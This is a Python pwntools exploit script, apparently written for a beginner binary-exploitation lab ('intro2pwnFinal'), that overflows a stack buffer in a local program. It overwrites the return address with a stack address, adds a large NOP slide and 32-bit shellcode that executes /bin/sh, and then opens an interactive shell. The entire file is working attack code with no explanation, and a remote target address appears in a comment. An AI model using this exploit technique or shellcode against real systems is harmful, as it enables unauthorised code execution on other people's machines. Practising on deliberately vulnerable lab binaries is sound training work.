from pwn import *

proc = process('./intro2pwnFinal')

proc.recvline()

padding = cyclic(cyclic_find('taaa'))

# connect = remote('10.10.113.53',1337)

eip = p32(0xffffd510+200)

nop_slide = "\x90"*1000

shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"

payload = padding + eip + nop_slide + shellcode

# print(payload)

proc.send(payload)

proc.interactive()